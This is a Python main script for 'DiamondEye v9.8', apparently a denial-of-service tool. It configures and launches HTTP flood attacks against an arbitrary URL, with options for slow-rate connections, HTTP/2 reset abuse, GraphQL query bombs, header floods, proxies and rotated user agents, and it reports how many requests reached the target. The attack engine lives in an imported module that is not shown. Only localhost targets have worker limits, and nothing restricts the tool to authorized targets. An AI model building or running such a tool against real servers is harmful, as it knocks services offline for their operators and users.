#!/usr/bin/env python3
import asyncio
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    print("\033[96m⚡ uvloop activated — speed boost enabled\033[0m")
except ImportError:
    print("\033[93mℹ️  uvloop not available — using default asyncio\033[0m")

import time
import signal
import sys
import websockets
import psutil
from urllib.parse import urlparse
import json
import os

try:
    import matplotlib.pyplot as plt
    MATPLOTLIB_AVAILABLE = True
except ImportError:
    MATPLOTLIB_AVAILABLE = False

from args import parse_args
from attack import DiamondEyeAttack  
from colorama import Fore, Style


def load_useragents(filepath: str) -> list:
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Fore.RED}[DEBUG] Failed to load useragents: {e}{Style.RESET_ALL}")
        return []


def parse_methods(raw: str) -> list:
    ALL_METHODS = ['GET', 'POST', 'PUT', 'PATCH', 'OPTIONS', 'HEAD']
    if not raw:
        return ['GET']
    if raw.upper() == 'ALL':
        return ALL_METHODS
    return [m.strip().upper() for m in raw.split(',') if m.strip().upper() in ALL_METHODS]


async def main():
    args = parse_args()

    if args.scan:
        print(f"{Fore.CYAN}🔍 Режим: Сканирование путей{Style.RESET_ALL}")
        try:
            from scanner import start_scan
            await start_scan(args.url, args.wordlist, args.threads, args.output)
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}🛑 Сканирование прервано{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {e}{Style.RESET_ALL}")
        return

    if args.http2 and args.extreme:
        print(f"{Fore.YELLOW}⚠️  --http2 несовместим с --extreme — отключено{Style.RESET_ALL}")
        args.http2 = False

    if args.http3 and args.extreme:
        print(f"{Fore.YELLOW}⚠️  --http3 несовместим с --extreme — отключено{Style.RESET_ALL}")
        args.http3 = False

    if args.flood and args.slow > 0:
        print(f"{Fore.YELLOW}⚠️  --flood отключает --slow — режимы конфликтуют{Style.RESET_ALL}")
        args.slow = 0.0

    if args.header_flood and not args.junk:
        print(f"{Fore.YELLOW}⚠️  --header-flood требует --junk — включен автоматически{Style.RESET_ALL}")
        args.junk = True

    if not args.url:
        print(f"{Fore.RED}❌ URL is required{Style.RESET_ALL}")
        sys.exit(1)
    try:
        parsed = urlparse(args.url)
        if not parsed.scheme or not parsed.netloc:
            print(f"{Fore.RED}❌ Invalid URL{Style.RESET_ALL}")
            sys.exit(1)
    except Exception:
        print(f"{Fore.RED}❌ URL parse error{Style.RESET_ALL}")
        sys.exit(1)

    useragents = load_useragents(args.useragents) if args.useragents else []
    netloc = parsed.netloc.lower()
    if netloc.startswith(('127.', 'localhost', '0.0.0.0')):
        useragents.append("CTF-Scanner/9.8")
        useragents.append("Mozilla/5.0 (X11; Linux x86_64) BountyHunter-Mode")

    methods = parse_methods(args.methods)

    if netloc.startswith(('127.', 'localhost', '0.0.0.0')):
        max_workers = max(1, psutil.cpu_count() * 4)
        if args.workers > max_workers:
            print(f"{Fore.YELLOW}🔧 Localhost: workers limited to {max_workers}{Style.RESET_ALL}")
            args.workers = max_workers

    attack = DiamondEyeAttack(
        url=args.url,
        workers=args.workers,
        sockets=args.sockets,
        methods=methods,
        useragents=useragents,
        no_ssl_check=args.no_ssl_check,
        debug=args.debug,
        proxy=args.proxy,
        use_http2=args.http2,
        use_http3=args.http3,
        websocket=args.websocket,
        auth=args.auth,
        h2reset=args.h2reset,
        graphql_bomb=args.graphql_bomb,
        adaptive=args.adaptive,
        slow_rate=args.slow,
        extreme=args.extreme,
        data_size=args.data_size,
        flood=args.flood,
        path_fuzz=args.path_fuzz,
        header_flood=args.header_flood,
        method_fuzz=args.method_fuzz,
        junk=args.junk,
        random_host=args.random_host
    )

    def signal_handler():
        if not hasattr(attack, '_shutdown_event') or attack._shutdown_event.is_set():
            return
        print(f"\n{Fore.RED}🛑 Stopping attack...{Style.RESET_ALL}")
        attack._shutdown_event.set()
        if attack._monitor_task:
            attack._monitor_task.cancel()
        if attack._rps_task:
            attack._rps_task.cancel()

    try:
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, signal_handler)
    except NotImplementedError:
        pass

    start_time = time.time()
    try:
        print(f"{Fore.GREEN}🚀 DiamondEye v9.8 — Attack started{Style.RESET_ALL}")
        await attack.start()
    except Exception as e:
        if args.debug:
            print(f"{Fore.RED}[ERROR] {e}{Style.RESET_ALL}")
    finally:
        await attack.shutdown()
        attack.print_stats()
        print(f"\n{Fore.GREEN}✅ Attack finished{Style.RESET_ALL}")

    duration = time.time() - start_time

    if args.log:
        try:
            os.makedirs(os.path.dirname(args.log), exist_ok=True)
            report = generate_report(attack, duration, args)
            with open(args.log, 'w', encoding='utf-8') as f:
                f.write(report)
            print(f"{Fore.CYAN}📝 Report saved: {args.log}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}❌ Log error: {e}{Style.RESET_ALL}")

    if args.json:
        try:
            os.makedirs(os.path.dirname(args.json), exist_ok=True)
            save_json_report(attack, duration, args, args.json)
            print(f"{Fore.CYAN}📦 JSON saved: {args.json}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}❌ JSON error: {e}{Style.RESET_ALL}")

    if args.plot:
        save_plot(attack, args.plot)


def generate_report(attack, duration, args):
    total = attack.sent
    failed = attack.failed
    success_rate = ((total - failed) / total * 100) if total > 0 else 0
    rps = int(total / (duration or 1))

    return f"""╔════════════════════════════════════════════════╗
║           DIAMONDEYE v9.8 — REPORT             ║
╚════════════════════════════════════════════════╝

🎯 Цель: {args.url}
⏱️  Время: {int(duration)}с
⚡ Режим: {'Flood' if args.flood else 'Normal'}{' + Extreme' if args.extreme else ''}
🔁 Воркеры: {args.workers} | Сокетов: {args.sockets}
📊 Отправлено: {total:,}
🚀 Средний RPS: {rps:,}
📈 Успешность: {success_rate:.1f}%
⚠️  Ошибок: {failed}

════════════════════════════════════════════════
DiamondEye v9.8 | by larion
"""


def save_json_report(attack, duration, args, filepath):
    rps = int(attack.sent / (duration or 1))
    success_rate = ((attack.sent - attack.failed) / attack.sent * 100) if attack.sent > 0 else 0

    report = {
        "tool": "DiamondEye",
        "version": "9.8",
        "target": args.url,
        "duration_sec": int(duration),
        "config": {k: v for k, v in vars(args).items() if k not in ['func']},
        "metrics": {
            "sent": attack.sent,
            "failed": attack.failed,
            "rps": rps,
            "success_rate": success_rate
        },
        "timestamp": time.time()
    }
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)


def save_plot(attack, filepath):
    if not MATPLOTLIB_AVAILABLE:
        print(f"{Fore.YELLOW}⚠️  matplotlib not installed{Style.RESET_ALL}")
        return
    if not attack.rps_history or len(attack.rps_history) < 2:
        return
    try:
        times = [p['time'] for p in attack.rps_history]
        rps = [p['rps'] for p in attack.rps_history]

        avg = sum(rps) / len(rps) if rps else 1
        rps = [x if x < avg * 3 else avg for x in rps]  

        plt.figure(figsize=(10, 5))
        plt.plot(times, rps, color='red', linewidth=1.2)
        plt.xlabel('Time (s)')
        plt.ylabel('RPS')
        plt.title('RPS over Time — DiamondEye v9.8')
        plt.grid(True, alpha=0.3)
        plt.tight_layout()
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        plt.savefig(filepath, dpi=120)
        plt.close()
        print(f"{Fore.CYAN}📊 Plot saved: {filepath}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Plot error: {e}{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Interrupted.")
    except Exception as e:
        print(f"{Fore.RED}❌ Error: {e}{Style.RESET_ALL}")
        sys.exit(1)
 